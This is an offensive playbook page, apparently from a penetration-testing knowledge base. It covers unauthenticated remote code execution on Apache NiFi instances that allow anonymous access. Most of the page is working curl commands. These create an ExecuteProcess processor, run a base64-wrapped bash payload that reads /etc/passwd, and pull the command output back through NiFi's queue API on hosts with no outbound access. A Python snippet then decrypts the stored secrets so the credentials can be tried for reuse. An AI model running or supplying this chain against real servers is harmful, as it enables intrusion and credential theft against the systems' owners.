# Apache NiFi Anonymous REST RCE + Egress-Restricted Output Exfil

## When this applies

- An Apache NiFi UI/API is reachable (often on a discovered vhost, e.g. `flow.<domain>`).
- Anonymous access is enabled and the anonymous user holds dangerous policies. NiFi's `ExecuteProcess` / `ExecuteStreamCommand` processors run arbitrary host commands *by design* — `execute-code` permission on the anonymous identity = unauthenticated RCE as the `nifi` service user.

## Detect

```bash
B=http://<NIFI_HOST>/nifi-api
# supportsLogin:false => anonymous access; version => CVE candidates
curl -s $B/access/config        # {"config":{"supportsLogin":false,...}}
curl -s $B/flow/about           # {"about":{"version":"1.21.0",...}}
# Does anonymous hold execute-code + filesystem RW?
curl -s $B/flow/current-user    # look for resource "/system" + componentRestrictions / canWrite:true
```

`supportsLogin:false` + a `current-user` showing `execute-code` (or all-permissions) is the green light. No token, no cookie needed.

## Exploit — create an ExecuteProcess processor

```bash
ROOT=$(curl -s $B/flow/process-groups/root | python3 -c 'import sys,json;print(json.load(sys.stdin)["processGroupFlow"]["id"])')
# Create the processor
curl -s -X POST $B/process-groups/$ROOT/processors -H 'Content-Type: application/json' -d '{
  "revision":{"version":0},
  "component":{"type":"org.apache.nifi.processors.standard.ExecuteProcess","position":{"x":0,"y":0}}}'
# => note the returned component.id  (call it EP)
```

`;` is NiFi's `Command Arguments` delimiter, so a raw command's internal `;`/spaces collide with it. Base64-wrap the payload to keep it a single argument:

```bash
CMD='id; uname -a; cat /etc/passwd'
B64=$(printf '%s' "$CMD" | base64 -w0)
# PUT processor config: Command=/bin/bash, args "-c;echo <b64>|base64 -d|bash"
curl -s -X PUT $B/processors/$EP -H 'Content-Type: application/json' -d "{
  \"revision\":{\"version\":<REV>},
  \"component\":{\"id\":\"$EP\",\"config\":{\"properties\":{
    \"Command\":\"/bin/bash\",\"Command Arguments\":\"-c;echo $B64|base64 -d|bash\"}}}}"
```

## Read output when the box has NO outbound (the key trick)

Reverse shells and DNS/HTTP callbacks fail on egress-filtered hosts. NiFi can still hand you stdout through its **own** data API — read it from a connection queue instead of a callback:

1. Create a sink processor (e.g. `LogAttribute`) and **leave it STOPPED** so FlowFiles pile up in the queue rather than draining.
2. Connect `ExecuteProcess(success) -> LogAttribute`, and remove `success` from the source's `autoTerminatedRelationships` so output is routed into the queue (not discarded):

```bash
curl -s -X POST $B/process-groups/$ROOT/connections -H 'Content-Type: application/json' -d "{
  \"revision\":{\"version\":0},
  \"component\":{\"source\":{\"id\":\"$EP\",\"groupId\":\"$ROOT\",\"type\":\"PROCESSOR\"},
    \"destination\":{\"id\":\"$LOG\",\"groupId\":\"$ROOT\",\"type\":\"PROCESSOR\"},
    \"selectedRelationships\":[\"success\"]}}"   # => CONN id
# autoTerminatedRelationships:[] on EP (PUT with current revision), then run EP briefly:
curl -s -X PUT $B/processors/$EP/run-status -d '{"revision":{"version":<REV>},"state":"RUNNING"}'
# ...wait until flowFilesQueued>0 on /connections/$CONN, then STOP it again.
```

3. List the queue and download the FlowFile content (= command stdout):

```bash
LID=$(curl -s -X POST $B/flowfile-queues/$CONN/listing-requests -d '{}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["listingRequest"]["id"])')
# poll GET $B/flowfile-queues/$CONN/listing-requests/$LID until finished:true, read flowFileSummaries[-1].uuid
curl -s "$B/flowfile-queues/$CONN/flowfiles/<UUID>/content"   # raw stdout
```

4. Clean up between runs so output doesn't accumulate: `POST $B/flowfile-queues/$CONN/drop-requests`, poll, `DELETE`.

This "read command output through the application's own queue/data API" pattern generalizes to any data-pipeline platform (NiFi, StreamSets, Airflow XComs) when the host blocks outbound and a callback/reverse shell is impossible.

## Loot embedded creds — decrypt sensitive properties on-box

The flow definition stores sensitive values (DBCP DB passwords, parameter-context secrets) encrypted, but the key ships on the same host — decrypt locally:

- `conf/flow.json.gz` (older: `conf/flow.xml.gz`) — encrypted values, scheme prefix `enc{...}` or algorithm `NIFI_PBKDF2_AES_GCM_256`.
- `conf/nifi.properties` — `nifi.sensitive.props.key=<plaintext key>`.

For `NIFI_PBKDF2_AES_GCM_256` the hex blob is `salt(16) || ciphertext || GCM-tag(16)`; PBKDF2-HMAC-SHA512, 160000 iterations, 32-byte key, the props-key *string bytes* are the password, and the GCM IV is the salt:

```python
import hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
key_str = "<nifi.sensitive.props.key>"
blob = bytes.fromhex("<encoded hex>")
salt, ct = blob[:16], blob[16:]                       # ct already includes the 16-byte tag
k = hashlib.pbkdf2_hmac("sha512", key_str.encode(), salt, 160000, 32)
print(AESGCM(k).decrypt(salt, ct, None))              # IV == salt
```

Then test reuse (`su`, `ssh`, DB login) — but treat app-scoped creds (e.g. an embedded H2/DBCP password) as *possibly* unrelated to OS accounts; confirm, don't assume. The generic "ciphertext + decryption key colocated on one host" principle and other examples live in [credential-files-hunt.md](credential-files-hunt.md).

## Anti-patterns

- Assuming you need egress / a reverse shell to use the RCE — the queue-read path returns stdout with zero outbound.
- Leaving the sink processor RUNNING — it drains the queue and the listing comes back empty. Keep it STOPPED.
- Sending a multi-token command straight into `Command Arguments` — the literal `;` delimiter mangles it. Base64-wrap.

## Cross-references

- Foothold fingerprint → vector map: [../../foothold-patterns.md](../../foothold-patterns.md).
- Analogous "anonymous web app → RCE, read output inline (no shell)" pattern with different mechanics: [jenkins-anon-script-console.md](jenkins-anon-script-console.md).